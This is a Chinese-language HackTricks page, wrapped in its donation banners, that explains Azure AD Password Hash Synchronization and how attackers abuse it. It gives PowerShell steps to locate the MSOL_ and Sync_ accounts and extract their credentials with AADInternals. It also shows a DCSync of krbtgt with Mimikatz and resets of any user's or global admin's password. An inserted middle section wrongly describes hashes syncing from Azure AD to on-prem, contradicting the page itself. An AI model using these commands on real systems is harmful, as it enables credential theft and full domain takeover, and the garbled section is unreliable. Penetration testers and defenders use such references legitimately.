# PHS - 密码哈希同步

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 HackTricks 的 PDF，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>

## 基本信息

**密码哈希同步**是实现混合身份的一种登录方法之一。Azure AD Connect 将来自本地 Active Directory 实例的用户密码的哈希同步到基于云的 Azure AD 实例中。

<figure><img src="../../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

这是公司用来将本地 AD 与 Azure AD 同步的**最常用方法**。

所有**用户**和**密码哈希的哈希**都从本地同步到 Azure AD。然而，**明文密码**或**原始哈希**不会发送到 Azure AD。\
此外，**内置**的安全组（如域管理员...）**不会被同步**到 Azure AD。

**哈希同步**每隔**2分钟**发生一次。然而，默认情况下，Azure AD **不会同步**密码过期和帐户过期。因此，一个**本地密码已过期**（未更改）的用户仍然可以使用旧密码继续**访问 Azure 资源**。

当本地用户想要访问 Azure 资源时，**身份验证将在 Azure AD 上进行**。

**PHS**对于诸如**身份保护**和 AAD 域服务等功能是必需的。

## 枢纽

当配置了 PHS 时，会自动创建一些**特权帐户**：

* 在本地 AD 中自动创建帐户**`MSOL_<installationID>`**。此帐户被赋予**目录同步帐户**角色（参见[文档](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)），这意味着它在本地 AD 中具有**复制（DCSync）权限**。
* 在 Azure AD 中创建一个帐户**`Sync_<name of on-prem ADConnect Server>_installationID`**。此帐户可以在 Azure AD 中**重置任何用户**（同步或仅云）的密码。

这两个特权帐户的密码**存储在安装 Azure AD Connect 的服务器上的 SQL 服务器中**。管理员可以以明文形式提取这些特权用户的密码。

如果**安装了 Azure AD Connect 的服务器**加入了域（在文档中推荐），可以使用以下方法找到它：
```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```
### AzureAD -> On-prem

#### 密码哈希同步（PHS）

密码哈希同步（PHS）是一种将Azure AD中的用户密码哈希同步到本地Active Directory（AD）的方法。这种方法允许用户在云和本地环境之间使用相同的密码进行身份验证。

#### PHS的工作原理

1. Azure AD Connect将用户密码哈希同步到本地AD。
2. 当用户尝试在本地环境中进行身份验证时，本地AD会将密码哈希与用户提供的密码进行比较。
3. 如果密码匹配，则用户被授权访问本地资源。

#### PHS的安全风险

1. 如果攻击者能够获取本地AD的密码哈希，他们可以使用这些哈希来进行离线破解攻击。
2. 如果本地AD的密码策略较弱，攻击者可以更容易地破解密码哈希。
3. 如果攻击者能够访问Azure AD Connect服务器，他们可以获取到密码哈希。

#### 防御措施

1. 使用强密码策略来保护本地AD中的密码。
2. 定期更改本地AD中的密码。
3. 限制对Azure AD Connect服务器的访问权限。
4. 监控并检测对Azure AD Connect服务器的未经授权访问尝试。

#### 总结

密码哈希同步（PHS）是一种将Azure AD中的用户密码哈希同步到本地AD的方法。然而，它也存在一些安全风险，因此需要采取相应的防御措施来保护密码哈希的安全性。
```powershell
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Get-AADIntSyncCredentials

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
### On-prem -> AzureAD

通过入侵`Sync_*`账户，可以重置任何用户的密码（包括全局管理员）
```powershell
# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
也有可能修改**仅云用户**的密码（尽管这是意外的）
```powershell
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
### 无缝单点登录

可以使用PTA与无缝单点登录一起使用，但这可能会导致其他滥用。在以下链接中进行检查：

{% content-ref url="seamless-sso.md" %}
[seamless-sso.md](seamless-sso.md)
{% endcontent-ref %}

## 参考资料

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版本的HackTricks，请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks商品**](https://peass.creator-spring.com)
* 发现[**The PEASS Family**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>
